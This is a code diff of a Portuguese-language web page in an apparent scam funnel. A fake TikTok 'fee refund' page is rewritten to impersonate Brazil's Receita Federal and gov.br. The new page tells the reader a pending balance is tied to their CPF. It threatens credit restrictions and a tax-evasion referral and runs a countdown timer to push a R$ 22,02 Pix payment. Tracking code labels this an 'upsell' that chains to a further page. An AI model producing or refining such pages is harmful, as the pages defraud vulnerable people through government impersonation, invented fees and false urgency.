@@ -35,161 +35,130 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
 
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok - Estorno de Taxas</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Receita Federal - Notificação Oficial</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap");
-        body { font-family: 'Inter', sans-serif; letter-spacing: -0.02em; background-color: #f3f4f6; }
         
-        details summary::-webkit-details-marker { display: none; }
-        
-        .cashback-container {
-            position: relative;
-            width: 120px;
-            height: 120px;
-            margin: 0 auto;
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: #f4f6f8; 
+            color: #1a202c;
+            margin: 0;
+            -webkit-font-smoothing: antialiased;
         }
 
-        .btn-tiktok {
-            background-color: #FE2C55;
-            transition: all 0.2s ease;
+        .gov-blue { background-color: #004088; }
+        
+        /* EFEITO DE CORES CORRENDO */
+        .animated-gradient {
+            background: linear-gradient(to right, #004088 0%, #0060c0 25%, #00a0e0 50%, #0060c0 75%, #004088 100%);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: flowing 2.5s linear infinite;
+            font-weight: 900;
         }
-        .btn-tiktok:active { transform: scale(0.95); }
 
-        /* Animação suave de entrada */
-        .fade-in { animation: fadeIn 0.8s ease-out forwards; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10deg); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes flowing {
+            to { background-position: 200% center; }
+        }
+
+        .shadow-formal {
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+        }
     </style>
 </head>
-<body class="text-[#161823]">
+<body class="flex flex-col min-h-screen">
 
-    <div class="bg-black text-white text-center py-3 px-4 text-[12px] font-bold uppercase tracking-tight leading-tight w-full sticky top-0 z-50 shadow-lg">
-        ATENÇÃO: CASO NÃO SAQUE O DINHEIRO DE IMEDIATO, ELE SERÁ ENVIADO PARA UM FUNDO DE DOAÇÃO E PERDERÁ 100% DO SALDO!
-    </div>
-
-    <div class="max-w-md mx-auto min-h-screen relative bg-white pb-10 shadow-2xl">
-        
-        <div class="flex justify-between items-center px-6 py-6 border-b border-gray-100">
-            <div class="flex flex-col">
-                <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Saldo Bloqueado</span>
-                <span class="text-3xl font-[900] text-[#161823] leading-none tracking-tighter">R$ 868,75</span>
-            </div>
-            <img src="/images/TikTok_logo.png" alt="TikTok" class="h-10 w-20 object-contain">
+    <header class="bg-white w-full border-b border-gray-200">
+        <div class="px-5 py-4 flex justify-start items-center">
+            <img src="https://logodownload.org/wp-content/uploads/2022/05/gov.br-logo-0.png" class="h-14" alt="Logo Gov.br">
         </div>
+        <div class="gov-blue w-full h-1"></div>
+    </header>
 
-        <div class="px-6 py-8">
-            <div class="text-center mb-8 fade-in">
-                <h1 class="text-2xl font-[900] text-slate-800 mb-2 leading-tight">RECEBA O DINHEIRO DAS TAXAS DE VOLTA</h1>
-                
-                <div class="cashback-container my-6">
-                    <img src="https://cdn-icons-gif.flaticon.com/12707/12707703.gif" alt="Estorno Animado" class="w-full h-full object-contain">
-                </div>
-                
-                <p class="text-sm font-bold text-[#FE2C55] bg-red-50 py-2 px-4 rounded-full inline-block">
-                    ⚠️ Transferência interrompida por pendência
-                </p>
+    <main class="flex-grow p-4">
+        <div class="max-w-md mx-auto bg-white rounded-xl shadow-formal overflow-hidden border border-gray-200 mt-2">
+            
+            <div class="bg-gray-50 py-10 flex flex-col items-center border-b border-gray-100 text-center">
+                <img src="/images/receitafederal.png" class="h-20 mb-4" alt="Receita Federal">
+                <p class="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em] px-6">Secretaria da Receita Federal do Brasil</p>
             </div>
 
-            <div class="bg-gray-50 border border-gray-100 rounded-3xl p-6 mb-8">
-                <p class="text-[14px] text-gray-700 leading-relaxed mb-6">
-                    Seu saldo foi enviado com sucesso mas a transferência foi interrompida pelo <b>sistema de segurança</b>. Veja abaixo os valores pagos em taxa:
-                </p>
-                
-                <div class="space-y-3">
-                    <div class="flex justify-between text-[13px]">
-                        <span class="text-gray-500 italic">Taxa de confirmação</span>
-                        <span class="font-bold text-gray-800">R$ 13,92</span>
-                    </div>
-                    <div class="flex justify-between text-[13px]">
-                        <span class="text-gray-500 italic">Taxa Única de Ativação</span>
-                        <span class="font-bold text-gray-800">R$ 21,11</span>
-                    </div>
-                    <div class="flex justify-between text-[13px]">
-                        <span class="text-gray-500 italic">Taxa Antecipação Prioritária</span>
-                        <span class="font-bold text-gray-800">R$ 18,43</span>
-                    </div>
-                    <div class="flex justify-between text-[13px]">
-                        <span class="text-gray-500 italic">Taxa Administrativa</span>
-                        <span class="font-bold text-gray-800">R$ 24,55</span>
-                    </div>
-                    <div class="flex justify-between text-[13px]">
-                        <span class="text-gray-500 italic">Taxa de Liberação de Saldo Retido</span>
-                        <span class="font-bold text-gray-800">R$ 19,88</span>
-                    </div>
-                    <div class="h-[1px] bg-gray-200 w-full my-2"></div>
-                    <div class="flex justify-between text-[15px]">
-                        <span class="font-black uppercase text-gray-400 text-[10px] tracking-widest mt-1">Total de taxas:</span>
-                        <span class="font-black text-[#FE2C55] underline">R$ 97,89</span>
+            <div class="p-6">
+                <h1 class="text-[#CC0000] text-[15px] font-black leading-tight mb-5 uppercase text-center tracking-tight">
+                    COMUNICAÇÃO OFICIAL URGENTE
+                </h1>
+
+                <div class="space-y-4 text-gray-600 text-[13px] leading-relaxed mb-8 text-center px-2">
+                    <p>Informamos que foi detectado um <b class="text-gray-900">saldo pendente</b> vinculado ao seu CPF. Para a regularização e liberação imediata, é necessário o recolhimento da taxa administrativa:</p>
+                </div>
+
+                <div class="bg-gray-50 rounded-2xl py-8 mb-8 border border-gray-100 text-center">
+                    <span class="text-gray-400 text-[10px] font-black uppercase tracking-widest block mb-1">Guia de Recolhimento Única</span>
+                    <div class="text-4xl animated-gradient tracking-tighter">
+                        R$ 22,02
                     </div>
                 </div>
-            </div>
 
-            <div class="border-2 border-black rounded-3xl p-6 bg-white shadow-[6px_6px_0px_0px_rgba(254,44,85,1)] mb-8">
-                <div class="text-center">
-                    <span class="text-[11px] font-black text-gray-400 uppercase tracking-widest">Valores a receber com as taxas:</span>
-                    <div class="text-4xl font-[900] text-gray-900 my-2 tracking-tighter">R$ 966,64</div>
-                    <p class="text-[10px] font-bold text-[#25F4EE] bg-black inline-block px-3 py-1 rounded-full uppercase leading-tight">
-                        + Saldo Pendente no App
-                    </p>
+                <div class="bg-red-50 border-l-4 border-red-600 p-5 mb-8 rounded-r-lg">
+                    <p class="text-[12px] font-black text-red-700 uppercase mb-2">Penalidades por Não Regularização:</p>
+                    <ul class="text-[11px] text-red-600 space-y-2 font-bold leading-snug">
+                        <li class="flex items-start gap-2"><span>•</span> Bloqueio imediato do saldo acumulado;</li>
+                        <li class="flex items-start gap-2"><span>•</span> Restrição do CPF em sistemas de crédito e bancários;</li>
+                        <li class="flex items-start gap-2"><span>•</span> Encaminhamento para análise de sonegação fiscal.</li>
+                    </ul>
                 </div>
-            </div>
 
-            <div class="bg-[#FFD700] rounded-3xl p-6 border-2 border-black mb-8 text-center">
-                <p class="text-[14px] font-bold text-black leading-tight">
-                  Para receber o estorno das taxas (R$ 97,89), é necessário o pagamento da taxa de estorno de 27%, no valor de R$ 22,02.
-Após o pagamento, o saldo será liberado com as taxas inclusas.
-                </p>
-            </div>
+                <div class="flex flex-col items-center mb-8">
+                    <span class="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">O prazo de regularização expira em:</span>
+                    <div id="timer" class="text-5xl animated-gradient tracking-tighter">05:00</div>
+                </div>
 
-            <div class="space-y-4">
-                <a href="#" onclick="irParaCheckout(event)"  class="btn-tiktok block w-full text-white text-center py-6 rounded-2xl shadow-xl transition-all active:scale-95">
-                    <span class="block font-black text-xl uppercase leading-none">RECEBER TAXA DE VOLTA!</span>
+                <a href="#" onclick="irParaCheckout(event)" class="block w-full gov-blue text-white text-center py-5 rounded-lg font-black text-lg shadow-2xl active:scale-95 transition-all mb-4 uppercase tracking-tighter">
+                    Pagar taxa e liberar valor
                 </a>
-         </div>
 
-            <div class="mt-8 border-t border-gray-100 pt-6 text-center">
-                <p class="text-[12px] text-gray-500 font-bold px-4 italic leading-relaxed">
-                    O sistema de segurança interrompeu seu saque devido a uma pendência. Para garantir a liberação do saldo juntamente com as taxas, é necessário efetuar o pagamento da taxa de estorno, correspondente a 27%.
-                </p>
-            </div>
-
-            <div class="mt-12 space-y-3 text-left">
-                <h3 class="text-lg font-[900] mb-4 px-2">Dúvidas:</h3>
-                
-                <details class="group bg-white rounded-2xl border border-gray-200">
-                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-sm">
-                        – Por que tem essa taxa?
-                        <span class="text-[#FE2C55] group-open:rotate-45 transition-transform text-xl">+</span>
-                    </summary>
-                    <div class="px-4 pb-4 text-[13px] text-gray-500 leading-relaxed">
-                        Todo aplicativo e plataforma tem um custo com servidores e para MANUTENÇÃO do APP essa taxa é um custo que temos ANUALMENTE de acordo com nosso número de usuários.
-                    </div>
-                </details>
-
-                <details class="group bg-white rounded-2xl border border-gray-200">
-                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-sm">
-                        – Se eu não pagar a taxa?
-                        <span class="text-[#FE2C55] group-open:rotate-45 transition-transform text-xl">+</span>
-                    </summary>
-                    <div class="px-4 pb-4 text-[13px] text-gray-500 leading-relaxed">
-                        O cliente tem até o final do dia após o suporte ter entrado em contato para pagar, caso não consiga, perderá sua vaga (VAGA NÃO É REEMBOLSÁVEL).
-                    </div>
-                </details>
+                <div class="flex items-center justify-center gap-2 py-4 border-t border-gray-50 mt-4 opacity-80">
+                    <img src="https://logodownload.org/wp-content/uploads/2022/05/gov.br-logo-0.png" class="h-4">
+                    <span class="text-[9px] font-bold text-gray-400 uppercase tracking-tighter">Ambiente 100% Seguro - gov.br/validação</span>
+                </div>
             </div>
         </div>
 
-        <footer class="py-10 text-center text-[10px] text-gray-300 font-bold uppercase tracking-[0.3em]">
-            TikTok Financial Services © 2026
-        </footer>
-    </div>
+        <div class="mt-8 text-center text-gray-400 max-w-xs mx-auto pb-10">
+            <p class="text-[9px] font-bold uppercase tracking-[0.2em] mb-2">Receita Federal | Ministério da Fazenda</p>
+            <p class="text-[8px] leading-relaxed opacity-60">
+                Notificação eletrônica protegida por criptografia de ponta a ponta.
+            </p>
+        </div>
+    </main>
 
+    <script>
+        function startTimer(duration, display) {
+            var timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--timer < 0) { timer = 0; }
+            }, 1000);
+        }
+        window.onload = function () {
+            startTimer(300, document.querySelector('#timer'));
+        };
+    </script>
+    <script src="/checkout/qrcode.min.js"></script>
+<script src="/checkout/up-checkout.js"></script>
 <script>
-function irParaCheckout(event){event.preventDefault();if(typeof ttq !== 'undefined' && typeof ttq.track === 'function'){try { ttq.track('InitiateCheckout', { content_id: 'upsell_7_tiktok', content_type: 'product', content_name: 'Taxa de Estorno 27%', contents: [{ content_id: 'upsell_7_tiktok', content_type: 'product', content_name: 'Taxa de Estorno 27%', quantity: 1, price: 22.02 }], value: 22.02, currency: 'BRL' }); } catch(e){}}window.abrirCheckoutPix({valor:22.02,titulo:"Taxa de Estorno 27%",proximoUrl:"../up7/index.html"});}
+function irParaCheckout(event){event.preventDefault();if(typeof ttq !== 'undefined' && typeof ttq.track === 'function'){try { ttq.track('InitiateCheckout', { content_id: 'upsell_6_tiktok', content_type: 'product', content_name: 'Guia de Recolhimento Única', contents: [{ content_id: 'upsell_6_tiktok', content_type: 'product', content_name: 'Guia de Recolhimento Única', quantity: 1, price: 22.02 }], value: 22.02, currency: 'BRL' }); } catch(e){}}window.abrirCheckoutPix({valor:22.02,titulo:"Guia de Recolhimento Única",proximoUrl:"../up7/index.html"});}
 </script>
 <script src="../assets/tracking.js"></script>
-<script src="/checkout/qrcode.min.js"></script>
-<script src="/checkout/up-checkout.js"></script>
 <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"3d04d58e8080411197bd269faa9f7da8","r":1,"spa":2}' crossorigin="anonymous"></script>
 </body>
 </html>
